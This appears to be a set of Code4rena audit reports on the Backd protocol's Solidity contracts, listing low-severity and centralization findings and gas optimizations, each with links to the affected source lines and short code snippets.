[VestedEscrow.sol#L55](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L55) - [AmmGauge.sol#L39](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L39)  If you set any wrong address, without being a contract, an EOA for example, it cannot be changed again:  - [Controller.sol#L36](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/Controller.sol#L36) - [Minter.sol#L100](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L100) - [InflationManager.sol#L61](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L61)  Lack of int range checks: - [Minter.sol#L61-L69](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L61-L69)  Not max defined: - [Preparable.sol#L29](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L29)  # Lack of ACK during owner change  It's possible to lose the ownership under specific circumstances.  Because an human error it's possible to set a new invalid owner. When you want to change the owner's address it's better to propose a new owner, and then accept this ownership with the new wallet.  Affected source code:  - [RoleManager.sol#L41-L48](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L41-L48) - [VestedEscrow.sol#L71](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L71)  # Avoid errors with transferFrom  The following methods take all the user's balance and send it through `transferFrom`, this call may fail, since `transferFrom` extracts the balance from the previously approved `allowance`, it is better to use the user's `allowance` in order to avoid the unnecessary failure when both amounts are not the same. It's better to use `allowance` instead of `balanceOf`.  Affected source code:  - [FeeBurner.sol#L68-L70](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/FeeBurner.sol#L68-L70)  # Wrong logic around `grantRole` and `revokeRole`.  The `RoleManager` contract contains a few special roles (`Roles.ADDRESS_PROVIDER`, `Roles.POOL_FACTORY`, `Roles.CONTROLLER`, `Roles.POOL` and `Roles.VAULT`) that are not controlled in the `grantRole` and `revokeRole` methods.  Affected source code:  - [RoleManager.sol#L37](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L37) - [RoleManager.sol#L111](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L111)  # Centralization risks  ## Multiple initialization  The `initialize` method of the `BkdLocker` contract allows it to be started multiple times as long as the value `startBoost=0` is set. Abuse these settings to his advantage.  Affected source code:  - [BkdLocker.sol#L53-L63](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L53-L63)  ## Centralized minting  The `minter` address can `mint` arbitrary amount of tokens. If the private key of the owner or minter address is compromised, the attacker will be able to `mint` an unlimited amount of tokens, or `burn` from arbitrary addresses.  Affected source code:  - [BkdToken.sol#L30](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/BkdToken.sol#L30)  ## Controlled swapRouter  The `FeeBurner` contract sets the `swapperRouter` in the `_addressProvider`, so the owner can set any type of swapper, paths or pools, even malicious ones. Since there is no slippage defined in the `FeeBurner` contract itself, it could be that a `swapperRouter` returns 0 WETH, and keeps the sent tokens.  Affected source code:  - [FeeBurner.sol#L73](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/FeeBurner.sol#L73) 
 # Outdated compiler  The pragma version used is `pragma solidity 0.8.10;` but recently solidity released a new version with important Bugfixes:  - The first one is related to ABI-encoding nested arrays directly from calldata. You can find more information [here](https://blog.soliditylang.org/2022/05/17/calldata-reencode-size-check-bug/).  - The second bug is triggered in certain inheritance structures and can cause a memory pointer to be interpreted as a calldata pointer or vice-versa. We also have a dedicated blog [post](https://blog.soliditylang.org/2022/05/17/data-location-inheritance-bug/) about this bug.  Apart from these, there are several minor bug fixes and improvements.  The minimum required version should be [0.8.14](https://github.com/ethereum/solidity/releases/tag/v0.8.14)  # Reduce the size of error messages (Long revert Strings)  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  I suggest shortening the revert strings to fit in 32 bytes, or that using custom errors as described next (require pragma upgrade).  ## Use Custom Errors instead of Revert Strings to save Gas  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  ### Source Custom Errors in Solidity:  Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert("Insufficient funds.");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).  Affected source code:  - [Errors.sol#L7-L111](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/libraries/Errors.sol#L7-L111) - [Minter.sol#L152](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L152)  # Delete optimization  Use `delete` instead of set to default value (`false` or `0`)  Affected source code:  - [RoleManager.sol#L158](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L158) - [Preparable.sol#L87-L88](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L87-L88) - [Preparable.sol#L99-L100](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L99-L100) - [Preparable.sol#L112](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L112) - [Preparable.sol#L142-L143](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L142-L143) - [Preparable.sol#L150-L151](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L150-L151) - [LpGauge.sol#L60](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/LpGauge.sol#L60) - [AmmGauge.sol#L64](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L64)  # unckecked keyword  It's possible to save gas using the `unckecked` keyword around the `i` variable. This will avoid the required checks to ensure that the variable won't overflow, and in the case of this for loop, is almost impossible:  Reference:  - https://docs.soliditylang.org/en/v0.8.0/control-structures.html#checked-or-unchecked-arithmetic  Affected source code:  - [PoolMigrationZap.sol#L22](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L22)  #  `++i` costs less gas compared to `i++` or `i += 1`  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means:  ```solidity uint i = 1; i++; // == 1 but i == 2 ```  But `++i` returns the actual incremented value:  ```solidity uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`. I suggest using `++i` instead of `i++` to increment the value of an uint variable. Same thing for `--i` and `i--`. Also, in some of the points mentioned below, it would be necessary to add `unckecked` since said variable is impossible to overflow.  Affected source code:  - [BkdLocker.sol#L140](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L140) - [RoleManager.sol#L82](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L82) - [RewardHandler.sol#L42](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L42) - [Controller.sol#L126](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/Controller.sol#L126) - [StakerVault.sol#L259](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L259) - [BkdLocker.sol#L310](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L310) - [FeeBurner.sol#L56](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/FeeBurner.sol#L56) - [KeeperGauge.sol#L157](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L157) - [VestedEscrow.sol#L94](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L94) - [InflationManager.sol#L98](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L98) - [InflationManager.sol#L112-L121](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L112-L121) - [InflationManager.sol#L173](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L173) - [InflationManager.sol#L198](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L198) - [InflationManager.sol#L267](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L267) - [InflationManager.sol#L291](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L291) - [InflationManager.sol#L366](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L366) - [InflationManager.sol#L390](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L390) - [InflationManager.sol#L413](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L413) - [InflationManager.sol#L454](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L454)  # Avoid unused returns  Having a method that always returns the same value is not correct in terms of consumption, if you want to modify a value, and the method will perform a `revert` in case of failure, it is not necessary to return a `true`, since it will never be `false`. It is less expensive not to return anything, and it also eliminates the need to double-check the returned value by the caller.  Affected source code:  - [Preparable.sol#L47](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L47) - [Preparable.sol#L71](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L71) - [Preparable.sol#L90](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L90) - [Preparable.sol#L102](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L102) - [StakerVault.sol#L79](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L79) - [StakerVault.sol#L84](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L84) - [StakerVault.sol#L90](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L90) - [StakerVault.sol#L101](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L101) - [AddressProvider.sol#L67](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L67) - [AddressProvider.sol#L74](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L74) - [AddressProvider.sol#L299](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L299) - [LpGauge.sol#L120](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/LpGauge.sol#L120) - [KeeperGauge.sol#L61](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L61) - [KeeperGauge.sol#L89](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L89) - [KeeperGauge.sol#L99](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L99) - [KeeperGauge.sol#L116](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L116) - [VestedEscrow.sol#L86](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L86) - [AmmGauge.sol#L53](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L53) - [AmmGauge.sol#L115](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L115) - [AmmGauge.sol#L137](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L137) - [AmmGauge.sol#L151](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L151) - [AmmGauge.sol#L160](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L160) - [InflationManager.sol#L62](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L62) - [InflationManager.sol#L72](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L72) - [InflationManager.sol#L102](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L102) - [InflationManager.sol#L124](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L124) - [InflationManager.sol#L142](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L142) - [InflationManager.sol#L178](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L178) - [InflationManager.sol#L202](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L202) - [InflationManager.sol#L233](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L233) - [InflationManager.sol#L275](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L275) - [InflationManager.sol#L300](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L300) - [InflationManager.sol#L318](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L318) - [InflationManager.sol#L347](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L347) - [InflationManager.sol#L371](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L371) - [InflationManager.sol#L395](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L395) - [InflationManager.sol#L437](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L437) - [InflationManager.sol#L488](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L488) - [InflationManager.sol#L578](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L578) - [InflationManager.sol#L592](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L592) - [InflationManager.sol#L606](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L606)  # Improve logic  It's possible to optimize the method `getRoleMember` of the contract `RoleManager` checking first if the `index` is 0.  Before:  ```javascript if (role == Roles.ADDRESS_PROVIDER && index == 0) {             return address(addressProvider);         } else if (role == Roles.POOL_FACTORY && index == 0) {             return addressProvider.getAddress(AddressProviderKeys._POOL_FACTORY_KEY);         } else if (role == Roles.CONTROLLER && index == 0) {             return addressProvider.getAddress(AddressProviderKeys._CONTROLLER_KEY);         } else if (role == Roles.POOL) {             return addressProvider.getPoolAtIndex(index);         } else if (role == Roles.VAULT) {             return addressProvider.getVaultAtIndex(index);         } ```  After:  ```javascript if (index == 0) {     if (role == Roles.ADDRESS_PROVIDER) return address(addressProvider);     if (role == Roles.POOL_FACTORY) return addressProvider.getAddress(AddressProviderKeys._POOL_FACTORY_KEY);     if (role == Roles.CONTROLLER) return addressProvider.getAddress(AddressProviderKeys._CONTROLLER_KEY); } if (role == Roles.POOL) return addressProvider.getPoolAtIndex(index); if (role == Roles.VAULT) return addressProvider.getVaultAtIndex(index); ```  *Note that also, this change will increase readability.*  Affected source code:  - [RoleManager.sol#L97-L107](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L97-L107)  # Inline improve  El metodo `uncheckedInc` de la libreria `UncheckedMath ` pretenden ahorrar gas, pero suponiendo que el compilador lo optimize al ser mayor a [0.8.2](https://github.com/ethereum/solidity/blob/develop/Changelog.md#082-2021-03-02) y se compile como inline, aun así devolverá un valor a la pila que puede ser evitado. Y además es más optimo utiliza ++a en lugar de a+1;  The `uncheckedInc` method of the `UncheckedMath ` library is intended to save gas, but assuming the compiler optimizes it because it's greater than [0.8.2](https://github.com/ethereum/solidity/blob/develop/Changelog.md#082-2021-03-02), it will still return a value on the stack that can be avoided. And it is also more optimal to use `++a` instead of `a + 1;`.  Affected source code:  - [UncheckedMath.sol#L4-L23](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/libraries/UncheckedMath.sol#L4-L23) 
# [G-01] Cache array length before loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop. This saves gas.  This was found in many places https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/RewardHandler.sol#L42 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L82 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/zaps/PoolMigrationZap.sol#L22 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/zaps/PoolMigrationZap.sol#L39 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L56 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L94 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L116 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L259  ## Recommended Mitigation Steps  Cache the array length before the for loop  # [G-02] Use != 0 instead of > 0  Using `> 0` uses slightly more gas than using `!= 0`. Use `!= 0` when comparing uint variables to zero, which cannot hold values below zero  Locations where this was found include https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L91 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L92 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L137 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L139 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L254 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L301 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/RewardHandler.sol#L63 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L117 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L68 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L114 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L84 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L575 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L589 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L602 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L88 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L125 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L147 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/KeeperGauge.sol#L140 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L107 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L129 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L158 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L171 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L197  ## Recommended Mitigation Steps  Replace `> 0` with `!= 0` to save gas  # [G-03] For loop incrementing can be unsafe  For loops that use i++ do not need to use safemath for this operation because the loop would run out of gas long before this point. Making this addition operation unsafe using unchecked saves gas. This is already used in many places with `i = i.uncheckedInc()`.  Sample code to make the for loop increment unsafe ``` for (uint i = 0; i < length; i = unchecked_inc(i)) {     // do something that doesn't change the value of i }  function unchecked_inc(uint i) returns (uint) {     unchecked {         return i + 1;     } } ```  Idea borrowed from https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked  There is one loop and that can use this change https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/zaps/PoolMigrationZap.sol#L22  ## Recommended Mitigation Steps  Make the increment in for loops unsafe to save gas  # [G-04] Use iszero assembly for zero checks  Comparing a value to zero can be done using the `iszero` EVM opcode. This can save gas  Source from t11s https://twitter.com/transmissions11/status/1474465495243898885  There are many places where a value is compared to zero https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L59 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L271 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L97 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L99 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L101 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/zaps/PoolMigrationZap.sol#L57 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/utils/Preparable.sol#L28 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L61 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L69 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L75 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L53 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L144 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L105 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L133 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L165 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L174 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L183 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L496 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L514 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L522 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L106  ## Recommended Mitigation Steps  Use the assembly `iszero` evm opcode to compare values to zero  # [G-05] Save gas with unchecked  Use unchecked math when there is no overflow risk to save gas. Before index is decreased in remove it is checked for zero condition. This means index will not underflow and can be unchecked.  These subtractions do not need to be checked for underflows because there is a require earlier that confirms the underflow will not happen. Use the `uncheckedSub` function https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L124 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L338  ## Recommended Mitigation Steps  Add unchecked around math that can't overflow for gas savings. In Solidity before 0.8.0, use the normal math operators instead of safe math functions.  # [G-06] Add payable to functions that won't receive ETH  Identifying a function as payable saves gas. Functions that have a modifier like onlyGovernance or onlyAuthorizedToPause cannot be called by normal users and will not mistakenly receive ETH. These functions can be payable to save gas.  There are many functions that have the auth modifier in the contracts. Some examples are https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L58 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L70 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L37 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L41 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L45 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L50 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L54 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L111 